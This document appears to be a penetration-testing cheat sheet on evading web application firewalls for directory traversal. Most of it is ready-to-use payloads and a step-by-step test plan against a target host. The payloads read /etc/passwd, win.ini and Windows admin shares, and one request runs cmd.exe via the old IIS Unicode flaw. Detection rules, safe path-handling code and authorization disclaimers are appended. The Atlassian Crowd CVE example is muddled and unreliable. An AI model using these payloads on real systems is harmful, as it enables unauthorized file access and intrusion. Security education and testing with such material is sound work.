# Advanced WAF Bypass Techniques for Directory Traversal

## Table of Contents
1. [Introduction](#introduction)
2. [Payload Categories](#payload-categories)
3. [Testing Methodology](#testing-methodology)
4. [Bypass Techniques Explained](#bypass-techniques-explained)
5. [Real-World Examples](#real-world-examples)
6. [Detection and Prevention](#detection-and-prevention)
7. [Legal and Ethical Considerations](#legal-and-ethical-considerations)

---

## Introduction

This document provides comprehensive guidance on advanced Web Application Firewall (WAF) bypass techniques specifically for directory traversal vulnerabilities. These techniques are intended for **authorized security testing only** as part of whitehat penetration testing, bug bounty programs, or security research.

### Prerequisites
- Written authorization for security testing
- Understanding of HTTP protocols
- Knowledge of encoding schemes
- Familiarity with web server architectures

---

## Payload Categories

### 1. URL Encoding Variations

**Purpose**: Bypass WAFs that only check for literal `../` patterns

**Techniques**:
- **Single Encoding**: `%2e%2e%2f` (encodes `../`)
- **Double Encoding**: `%252e%252e%252f` (encodes the percent sign itself)
- **Triple Encoding**: `%25252e%25252e%25252f` (three layers of encoding)
- **Mixed Encoding**: Combine encoded and raw characters

**When to Use**:
- WAF performs single-pass decoding
- Application decodes multiple times
- Different components decode at different stages

**Example**:
```
Normal: ../../etc/passwd
Single: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
Double: %252e%252e%252f%252e%252e%252fetc%252fpasswd
```

---

### 2. Unicode Encoding Bypasses

**Purpose**: Exploit UTF-8/UTF-16 normalization vulnerabilities

**Techniques**:
- **UTF-16 Encoding**: `%u002e%u002e%u2215` (Unicode representation)
- **Overlong UTF-8**: `%c0%ae%c0%ae%c0%af` (non-standard encoding)
- **Normalization Forms**: Different Unicode representations of same character

**How It Works**:
Overlong UTF-8 encoding represents characters using more bytes than necessary. For example:
- Normal: `/` = `0x2F` (1 byte)
- Overlong: `/` = `%c0%af` (2 bytes: `1100 0000 1010 1111`)

While forbidden by UTF-8 standard, many decoders accept it for performance reasons.

**Vulnerable Systems**:
- IIS (historically vulnerable)
- Custom Unicode decoders
- Systems with improper validation before decoding

**Example**:
```
UTF-16: %u002e%u002e%u2215etc%u2215passwd
Overlong: %c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

---

### 3. Nested/Recursive Filter Bypass

**Purpose**: Bypass WAFs that strip traversal sequences non-recursively

**How It Works**:
If a WAF removes `../` once, payloads like `....//` become `../` after filtering:
```
....// → ../ (after removing one ../)
```

**Techniques**:
- `....//....//etc/passwd`
- `..././..././etc/passwd`
- `..\.\/..\.\./etc/passwd`

**When to Use**:
- WAF performs single-pass string replacement
- Sanitization doesn't apply recursively
- Multiple filtering layers decode differently

---

### 4. Null Byte Injection

**Purpose**: Bypass extension validation and path checks

**How It Works**:
Null byte (`%00`) terminates strings in C/C++. WAF may see entire string, but backend truncates at null:
```
WAF sees: ../../etc/passwd%00.jpg (safe, looks like image)
Backend sees: ../../etc/passwd (stops at %00)
```

**Techniques**:
- `../../etc/passwd%00`
- `../../etc/passwd%00.jpg`
- `./%00./.%00./etc/passwd`
- `../../etc/passwd%00%00` (double null)

**Vulnerable Systems**:
- PHP < 5.3.4
- Legacy C/C++ applications
- Systems with improper string handling

---

### 5. Reverse Proxy & Server-Specific Bypasses

**Purpose**: Exploit discrepancies between reverse proxy and backend server

#### Nginx/Tomcat Discrepancy (`..;/`)

**How It Works**:
- Nginx treats `/..;/` as a directory
- Tomcat treats it as `/../` (traversal)
- WAF at Nginx level passes request, Tomcat executes traversal

**Example**:
```
/services/pluginscript/..;/..;/..;/getFavicon
/api/..;/..;/..;/etc/passwd
```

#### IIS Unicode Normalization

IIS historically had Unicode normalization vulnerabilities:
```
..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9cetc%c1%9cpasswd
```

#### ASP.NET Cookieless Session

ASP.NET session identifiers can be injected into paths:
```
/(S(X))/admin/(S(X))/../../etc/passwd
/(G(AAA-BBB)D(CCC=DDD)E(0-1))/../../etc/passwd
```

---

### 6. Case Variation & Mixed Case

**Purpose**: Bypass case-sensitive WAF rules on case-insensitive filesystems

**How It Works**:
- WAF checks for `etc/passwd` (case-sensitive)
- Windows filesystem is case-insensitive
- `EtC/PaSsWd` bypasses WAF but accesses same file

**Techniques**:
```
../../../Etc/Passwd
../../../ETC/PASSWD
../../../eTc/pAsSwD
..%2F..%2FEtc%2FPasswd
```

**Vulnerable Systems**:
- Windows servers
- Case-insensitive Linux mounts
- Applications with case-insensitive path handling

---

### 7. Path Separator Mixing

**Purpose**: Exploit different path separator handling

**How It Works**:
- Forward slash `/` (Unix/Linux)
- Backslash `\` (Windows)
- Mixed separators confuse parsers

**Techniques**:
```
..\/../..\/../etc/passwd
..\/..\/..\/etc/passwd
../\../\../\etc/passwd
..%2f..%5c..%2fetc%2fpasswd
```

**When to Use**:
- Cross-platform applications
- Windows servers
- Systems normalizing path separators

---

### 8. UNC Path Injection (Windows)

**Purpose**: Access Windows shares and bypass path restrictions

**How It Works**:
Universal Naming Convention (UNC) paths access network shares:
```
\\localhost\c$\windows\win.ini
\\127.0.0.1\c$\windows\system32\drivers\etc\hosts
\\.\c$\windows\win.ini
```

**Encoded Versions**:
```
%5c%5clocalhost%5cc$%5cwindows%5cwin.ini
%5c%5c.%5cc$%5cwindows%5cwin.ini
```

**Vulnerable Systems**:
- Windows servers with administrative shares enabled
- Applications accepting UNC paths
- SMB-enabled systems

---

### 9. Protocol-Based Bypasses

**Purpose**: Use protocol handlers to access files

**Techniques**:
```
file:///etc/passwd
url:file:///etc/passwd
jar:file:///../../etc/passwd
url:http://127.0.0.1:8080/../../etc/passwd
```

**When to Use**:
- Java applications (jar: protocol)
- Applications with URL handlers
- Systems processing file:// URIs

---

### 10. Whitespace & Non-Printable Characters

**Purpose**: Bypass pattern matching with invisible characters

**Techniques**:
- Space: `..%20/..%20/etc/passwd`
- Tab: `..%09/..%09/etc/passwd`
- Newline: `..%0a/..%0a/etc/passwd`
- Carriage Return: `..%0d/..%0d/etc/passwd`
- CRLF: `..%0d%0a/..%0d%0a/etc/passwd`

**When to Use**:
- WAF doesn't normalize whitespace
- Backend strips whitespace
- Applications with loose parsing

---

### 11. Hybrid Encoding Combinations

**Purpose**: Combine multiple encoding techniques

**Techniques**:
```
URL + Unicode: %2e%2e%u2215etc%u2215passwd
Double + Unicode: %252e%252e%u2215etc%u2215passwd
URL + Null: ..%2f..%2f%00etc%2fpasswd
Overlong + URL: %c0%ae%c0%ae%252f%c0%ae%c0%ae%252fetc%252fpasswd
Everything: %c0%ae%2e%u002e%252e/%c0%ae%2e%u002e%252e/etc/passwd
```

**When to Use**:
- Multiple filtering layers
- Complex WAF rules
- Defense-in-depth scenarios

---

## Testing Methodology

### Phase 1: Reconnaissance

1. **Identify Technology Stack**
   ```bash
   # Check server headers
   curl -I https://target.com

   # Check WAF fingerprint
   wafw00f https://target.com
   ```

2. **Map Application Structure**
   - Identify file upload endpoints
   - Find image/document viewers
   - Locate include parameters
   - Check template engines

### Phase 2: Baseline Testing

1. **Test Basic Traversal**
   ```
   ?file=../../etc/passwd
   ?page=../../../etc/passwd
   ?template=../../../../etc/passwd
   ```

2. **Check WAF Response**
   - 403 Forbidden (WAF block)
   - 404 Not Found (path normalized)
   - 200 OK (vulnerable or different issue)

### Phase 3: Encoding Bypasses

Start with simple encoding and progressively increase complexity:

1. **Single URL Encoding**
   ```
   %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
   ```

2. **Double URL Encoding**
   ```
   %252e%252e%252f%252e%252e%252fetc%252fpasswd
   ```

3. **Unicode Variants**
   ```
   %u002e%u002e%u2215etc%u2215passwd
   %c0%ae%c0%ae%c0%afetc%c0%afpasswd
   ```

### Phase 4: Context-Specific Bypasses

Test based on identified technology:

**For Nginx/Tomcat**:
```
/api/..;/..;/..;/etc/passwd
```

**For IIS**:
```
..%c0%af..%c0%afetc%c0%afpasswd
```

**For Windows**:
```
..\..\..\windows\win.ini
\\localhost\c$\windows\win.ini
```

### Phase 5: Combination Attacks

Combine multiple techniques:
```
....//....//etc/passwd%00
%2e%2e;/%2e%2e;/etc;/passwd%00.jpg
%c0%ae%c0%ae%2f%c0%ae%c0%ae%2f%00etc%2fpasswd
```

---

## Real-World Examples

### Example 1: CVE-2019-11580 (Atlassian Crowd)

**Vulnerability**: Path traversal in widget connector

**Exploit**:
```
POST /crowd/plugins/servlet/exp?cmd=cat%20/etc/passwd
```

**Bypass Used**: URL parameter injection with command execution

---

### Example 2: Nginx/Tomcat Misconfiguration

**Setup**:
- Nginx as reverse proxy (checks for `../`)
- Tomcat as backend

**Bypass**:
```
GET /services/pluginscript/..;/..;/..;/getFavicon HTTP/1.1
```

**How It Works**:
- Nginx sees `/..;/` as safe path component
- Tomcat interprets `..;/` as `../`
- Traversal executes at backend

---

### Example 3: IIS Unicode Bypass

**Historical Vulnerability**: IIS 5.0

**Exploit**:
```
GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0
```

**How It Works**:
- `%c0%af` is overlong encoding of `/`
- IIS decoded it after path validation
- RCE achieved via cmd.exe access

---

### Example 4: PHP Null Byte Bypass

**Vulnerable Code**:
```php
<?php
$file = $_GET['file'];
include($file . ".php");
?>
```

**Bypass**:
```
?file=../../etc/passwd%00
```

**Result**:
- PHP sees: `../../etc/passwd%00.php`
- Null byte terminates string before `.php`
- Includes `../../etc/passwd` instead

---

## Detection and Prevention

### For Security Teams

#### Detection Methods

1. **WAF Rules**
   ```
   # ModSecurity example
   SecRule ARGS "@rx \.\./" \
       "id:1,phase:2,deny,log,msg:'Path Traversal Attack'"

   # Detect encoded variants
   SecRule ARGS "@rx %2e%2e[%2f%5c]" \
       "id:2,phase:2,deny,log,msg:'Encoded Path Traversal'"
   ```

2. **Logging & Monitoring**
   - Monitor for unusual URL patterns
   - Track parameter manipulation
   - Alert on encoding anomalies
   - Watch for high-depth traversal attempts

3. **Anomaly Detection**
   - Baseline normal path depths
   - Alert on excessive `../` sequences
   - Monitor file access patterns
   - Track encoding frequency

#### Prevention Measures

1. **Input Validation**
   ```python
   import os

   def safe_path(base_dir, user_input):
       # Resolve absolute path
       requested = os.path.abspath(os.path.join(base_dir, user_input))

       # Ensure it's within base directory
       if not requested.startswith(os.path.abspath(base_dir)):
           raise SecurityError("Path traversal attempt")

       return requested
   ```

2. **Whitelist Approach**
   ```python
   ALLOWED_FILES = {
       'home': '/var/www/html/home.php',
       'about': '/var/www/html/about.php',
       'contact': '/var/www/html/contact.php'
   }

   file = ALLOWED_FILES.get(user_input)
   if file is None:
       raise ValueError("Invalid file")
   ```

3. **Canonical Path Checking**
   ```java
   File file = new File(basePath, userInput);
   String canonical = file.getCanonicalPath();

   if (!canonical.startsWith(basePath)) {
       throw new SecurityException("Path traversal detected");
   }
   ```

4. **Defense in Depth**
   - Input validation (reject `../`, encoded variants)
   - Canonical path resolution
   - Chroot jails / containers
   - Principle of least privilege
   - WAF with recursive decoding
   - Regular security audits

5. **Secure Coding Practices**
   - Never use user input directly in file paths
   - Implement proper error handling
   - Use framework-provided security functions
   - Regular dependency updates
   - Security code reviews

---

## Legal and Ethical Considerations

### Authorization Requirements

**You MUST have**:
- Written permission from system owner
- Defined scope of testing
- Clear rules of engagement
- Incident response plan

### Authorized Contexts

- Penetration testing engagements
- Bug bounty programs
- CTF competitions
- Educational lab environments
- Your own systems for learning

### Prohibited Activities

- Unauthorized access to systems
- Testing production without permission
- Destructive attacks (DoS, data deletion)
- Mass automated scanning
- Selling exploits to malicious actors

### Responsible Disclosure

If you discover a vulnerability:

1. **Document** the issue thoroughly
2. **Report** to the vendor/owner immediately
3. **Wait** for reasonable fix timeline (90 days standard)
4. **Coordinate** public disclosure
5. **Never** weaponize or sell exploits

### Legal Frameworks

- **CFAA (USA)**: Unauthorized access is federal crime
- **GDPR (EU)**: Data protection requirements
- **Varies by country**: Know local laws

---

## Tools and Resources

### Testing Tools

1. **Burp Suite** - Intercept and modify requests
2. **OWASP ZAP** - Automated scanning
3. **ffuf** - Fuzzing file paths
4. **dotdotpwn** - Automated traversal testing
5. **wfuzz** - Web application fuzzer

### Learning Resources

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackerOne Disclosed Reports](https://hackerone.com/hacktivity)

### Practice Environments

- **DVWA** - Damn Vulnerable Web Application
- **WebGoat** - OWASP training application
- **HackTheBox** - Penetration testing labs
- **TryHackMe** - Security training platform

---

## Conclusion

Advanced WAF bypass techniques require understanding of:
- Encoding schemes and normalization
- Server architecture differences
- Application parsing logic
- Defense mechanisms

**Remember**: These techniques are powerful and must only be used ethically and legally. Always obtain proper authorization before testing and report findings responsibly.

---

## Quick Reference

### Most Effective Techniques by Target

| Target System | Best Techniques |
|--------------|-----------------|
| IIS | Unicode overlong, UNC paths |
| Nginx/Tomcat | `..;/` bypass |
| PHP < 5.3.4 | Null byte injection |
| Windows | Path separator mixing, case variation |
| Java | Protocol handlers (jar:, url:) |
| Generic WAF | Double encoding, nested sequences |

### Testing Priority Order

1. Basic traversal (`../../etc/passwd`)
2. Single URL encoding (`%2e%2e%2f`)
3. Double encoding (`%252e%252e%252f`)
4. Server-specific (`..;/`, UNC paths)
5. Unicode/Overlong UTF-8
6. Null byte injection
7. Hybrid combinations

---

**Last Updated**: 2025
**For**: Authorized Security Testing Only
**License**: Educational and Research Purposes
